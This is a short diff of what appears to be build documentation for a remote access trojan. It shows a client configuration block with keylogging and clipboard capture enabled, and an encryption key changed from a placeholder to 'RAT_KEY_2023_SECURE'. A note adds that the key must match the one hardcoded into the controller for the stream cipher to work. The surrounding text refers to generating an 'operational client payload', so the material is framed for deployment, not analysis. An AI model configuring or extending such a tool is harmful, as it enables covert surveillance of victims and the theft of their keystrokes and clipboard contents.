@@ -68,7 +68,7 @@ Prior to generating the operational client payload, update the global environmen
   "maxRetries": 10,
   "keyloggerEnabled": true,
   "clipboardEnabled": true,
-  "encryptionKey": "ENTERPRISE_ROTATING_KEY_MASK"
+  "encryptionKey": "RAT_KEY_2023_SECURE"
 }
 ```
 *Note: The symmetric network stream relies on a fast stream cipher. The configuration key value must precisely match the key hardcoded into the controller application, or the cipher stream will corrupt communications.*
